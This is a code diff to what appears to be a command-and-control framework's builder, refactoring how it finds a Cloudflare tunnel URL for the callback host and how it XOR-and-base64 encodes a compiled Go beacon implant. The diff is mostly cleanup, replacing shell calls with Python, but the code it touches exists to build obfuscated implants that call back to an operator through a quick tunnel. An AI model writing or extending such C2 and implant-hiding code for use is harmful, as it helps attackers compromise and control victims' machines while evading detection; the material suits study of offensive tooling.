@@ -9,13 +9,16 @@ from __future__ import annotations
 import base64
 import json
 import os
+import re
 import shutil
+import subprocess
 import tempfile
 import time
 from collections.abc import Callable
 from contextlib import contextmanager
 from dataclasses import dataclass, field
 from datetime import datetime
+from pathlib import Path
 from typing import Any
 
 from core.validators import check_lhost, check_lport
@@ -32,8 +35,7 @@ from utils import (
 )
 
 _GO_CANDIDATE_PATHS = (
-    "/usr/local/go/bin/go",
-    os.path.expanduser("~/go/bin/go"),
+    str(Path.home() / "go" / "bin" / "go"),
     "/usr/bin/go",
     "/usr/local/bin/go",
 )
@@ -239,10 +241,18 @@ class C2Builder:
         lport_param = str(self.params["c2_port"])
 
         if use_tunnel:
-            tunnel_cmd = """link=$(grep -o 'https://[-0-9a-z]*\\.trycloudflare.com' "cf.log")
-echo "Cloudflare Tunnel URL: $link"
-"""
-            os.system(tunnel_cmd)
+            tunnel_url = ""
+            try:
+                cf_log = Path("cf.log")
+                if cf_log.exists():
+                    cf_content = cf_log.read_text(encoding="utf-8", errors="replace")
+                    match = re.search(r"https://[-0-9a-z]+\.trycloudflare\.com", cf_content)
+                    if match:
+                        tunnel_url = match.group(0)
+            except OSError:
+                pass
+            if tunnel_url:
+                print(f"Cloudflare Tunnel URL: {tunnel_url}")
             lhost = input(
                 "Enter your Cloudflare tunnel subdomain (e.g., yoursubdomain.trycloudflare.com): "
             ).strip()
@@ -594,21 +604,16 @@ chmod +x /tmp/stub && \
             shutil.copy(file, newname)
 
         # --- Beacon encryption ---
-        encbeacon = f"""
-python3 -c "
-import base64
-with open('sessions/{binary}', 'rb') as f:
-    data = f.read()
-    xor_data = bytes([b ^ 0x33 for b in data])
-    b64_data = base64.b64encode(xor_data)
-with open('sessions/beacon.enc', 'wb') as f:
-    f.write(b64_data)
-"
-""".replace(
-            "        ", ""
-        )
-        self.toastr(f"Executing... {encbeacon}", type="info")
-        os.system(encbeacon)
+        self.toastr(f"Encrypting beacon {binary}...", type="info")
+        src_path = Path(self.sessions_dir) / binary
+        enc_path = Path(self.sessions_dir) / "beacon.enc"
+        try:
+            data = src_path.read_bytes()
+            xor_data = bytes([b ^ 0x33 for b in data])
+            b64_data = base64.b64encode(xor_data)
+            enc_path.write_bytes(b64_data)
+        except OSError as exc:
+            print_msg(f"Beacon encryption failed: {exc}")
         print_msg(f"Go agent {implantgo} compiled successfully.")
 
         # --- MD5 ---
